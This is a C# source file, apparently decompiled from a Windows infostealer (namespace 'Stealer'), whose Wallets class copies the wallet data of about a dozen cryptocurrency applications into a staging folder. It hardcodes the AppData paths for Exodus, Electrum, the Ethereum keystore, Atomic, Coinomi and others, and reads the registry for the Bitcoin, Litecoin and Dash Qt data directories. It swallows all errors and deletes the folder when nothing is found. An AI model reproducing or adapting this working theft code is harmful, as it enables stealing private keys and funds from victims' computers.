using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using RFStub;

namespace Stealer;

internal sealed class Wallets
{
	private static List<string[]> sWalletsDirectories = new List<string[]>
	{
		new string[2]
		{
			"Zcash",
			Paths.appdata + "\\Zcash"
		},
		new string[2]
		{
			"Armory",
			Paths.appdata + "\\Armory"
		},
		new string[2]
		{
			"Bytecoin",
			Paths.appdata + "\\bytecoin"
		},
		new string[2]
		{
			"Jaxx",
			Paths.appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"
		},
		new string[2]
		{
			"Exodus",
			Paths.appdata + "\\Exodus\\exodus.wallet"
		},
		new string[2]
		{
			"Ethereum",
			Paths.appdata + "\\Ethereum\\keystore"
		},
		new string[2]
		{
			"Electrum",
			Paths.appdata + "\\Electrum\\wallets"
		},
		new string[2]
		{
			"AtomicWallet",
			Paths.appdata + "\\atomic\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Guarda",
			Paths.appdata + "\\Guarda\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Coinomi",
			Paths.lappdata + "\\Coinomi\\Coinomi\\wallets"
		}
	};

	private static string[] sWalletsRegistry = new string[3] { "Litecoin", "Dash", "Bitcoin" };

	public static void GetWallets(string sSaveDir)
	{
		try
		{
			Directory.CreateDirectory(sSaveDir);
			foreach (string[] sWalletsDirectory in sWalletsDirectories)
			{
				CopyWalletFromDirectoryTo(sSaveDir, sWalletsDirectory[1], sWalletsDirectory[0]);
			}
			string[] array = sWalletsRegistry;
			foreach (string sWalletRegistry in array)
			{
				CopyWalletFromRegistryTo(sSaveDir, sWalletRegistry);
			}
			if (Counter.Wallets == 0)
			{
				Filemanager.RecursiveDelete(sSaveDir);
			}
		}
		catch
		{
		}
	}

	private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletName);
		if (Directory.Exists(sWalletDir))
		{
			Filemanager.CopyDirectory(sWalletDir, destFolder);
			Counter.Wallets++;
		}
	}

	private static void CopyWalletFromRegistryTo(string sSaveDir, string sWalletRegistry)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletRegistry);
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")!.OpenSubKey(sWalletRegistry)!.OpenSubKey(sWalletRegistry + "-Qt");
			if (registryKey != null)
			{
				string text = registryKey.GetValue("strDataDir")!.ToString() + "\\wallets";
				if (Directory.Exists(text))
				{
					Filemanager.CopyDirectory(text, destFolder);
					Counter.Wallets++;
				}
			}
		}
		catch
		{
		}
	}
}
